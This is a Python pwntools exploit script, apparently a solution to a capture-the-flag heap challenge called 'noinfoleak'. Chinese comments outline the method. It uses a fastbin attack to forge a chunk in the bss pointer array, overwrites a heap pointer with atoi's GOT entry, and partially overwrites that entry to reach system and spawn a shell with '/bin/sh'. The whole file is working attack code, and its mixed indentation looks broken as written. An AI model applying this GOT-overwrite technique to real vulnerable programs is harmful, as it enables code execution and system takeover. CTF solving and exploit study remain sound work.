#!/usr/bin/python
#程序没开PIE，利用fastbin_attack,
#在存放申请堆内存指针的bss段伪造chunk，并分配到该chunk
#控制下方的堆chunk指针，覆盖为atoi got表地址（经研究发现atoi与system偏移相近）
#编辑atoi got表中的内容，写低2byte，有很大的几率getshell

from pwn import *

def g():
    gdb.attach(p)
    raw_input()

def malloc(size,data):
    p.recvuntil(">")
    p.sendline(str(1))
    p.recvuntil(">")
    p.sendline(str(size))
    p.recvuntil(">")
    p.sendline(data)   

def free(index):
    p.recvuntil(">")
    p.sendline(str(2))
    p.recvuntil(">")
    p.sendline(str(index))

def edit(index,data):
    p.recvuntil(">")
    p.sendline(str(3))
    p.recvuntil(">")
    p.sendline(str(index))
    p.recvuntil(">")
    p.send(data)  



if __name__ == '__main__':
	elf=ELF("./noinfoleak")
	p=process("./noinfoleak")
	atoi_got=elf.got["atoi"]
	#p=remote('ctf1.linkedbyx.com',10426)

	malloc(0x60,"1111")
	malloc(0x60,"2222")
	malloc(0x7f,"3333")
	malloc(0x60,"4444")
	malloc(0x60,"5555")
        free(0)	
        	
	edit(0,p64(0x6010c0))
        malloc(0x60,"1111")
        malloc(0x60,p64(atoi_got))        
        edit(3,"\x90\xf3")
	 #g()
	p.recvuntil(">")
        p.sendline('/bin/sh')
	p.interactive()

 
